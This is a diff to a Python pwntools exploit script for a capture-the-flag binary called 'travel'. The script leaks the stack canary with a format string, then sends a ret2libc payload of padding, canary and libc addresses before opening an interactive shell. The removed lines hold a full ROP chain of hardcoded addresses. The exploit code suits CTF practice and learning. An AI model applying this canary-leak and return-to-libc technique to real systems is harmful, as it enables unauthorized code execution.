@@ -1,35 +1,26 @@
-import pwn
+from pwn import *
 import threading
 from struct import pack
 
-# base_libc = 0x7ffff7d96000
-# remove debug output
-pwn.context.log_level = 'WARNING'
+# settings
+context.log_level = 'WARNING'
+context.terminal = ['konsole', '-e']
 
-# set library
-
-
+libc = ELF('./libc.so.6')
 LOCAL = "./travel"
 REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 50106]
-
-def thread(func):
-    def wrapper(*args, **kwargs):
-        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
-        thread.start()
-        return thread
-    return wrapper
 
 class Exploit:
     def __init__(self, local=False, debug=False):
         if local:
-            self.p = "pwn.process(LOCAL)"
+            self.p = "process(LOCAL, env={'LD_PRELOAD': './libc.so.6'})"
         else:
-            self.p = "pwn.remote(REMOTE[0], REMOTE[1])"
+            self.p = "remote(REMOTE[0], REMOTE[1])"
         
         self.debug = debug
-        
         self.canary_address = 33
         self.buffer_max = 215
+        self.libc_base = 0x7faa483eb000
     
     def get_canary(self, proc):
         'sending format string to leak the stack canary'
@@ -42,11 +33,19 @@ class Exploit:
         return p
     
     def return_to_libc(self, proc, canary):
-        payload = b"\x90"*(self.buffer_max-15)+canary+b'\x90'*12+pack('<Q', 0x7ffff7dc03e5)+pack('<Q', 0x7ffff7f6e698)+pack('<Q', 0x7ffff7e9eb13)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x7ffff7dc1e51)+pack('<Q', 0x7ffff7f6e698)+pack('<Q', 0x7ffff7e810f0)
+        if self.debug:
+            script = "b *main+323"
+            gdb.attach(proc, gdbscript=script)
+        
+        payload = b"A"*(self.buffer_max-15)     # padding - formatstring
+        payload += canary                       # canary value
+        payload += b'\x90'*8                    # junk
+        
+        payload += pack("<Q", self.libc_base)
+        
         p = proc.recv(100)
         p = proc.sendline(payload)
         p = proc.recv(100)
-        proc.clean()
         proc.interactive()
         
     def start(self):
@@ -55,4 +54,4 @@ class Exploit:
             self.return_to_libc(r, canary)
             
 
-Exploit(local=True).start()
+Exploit(local=True, debug=True).start()
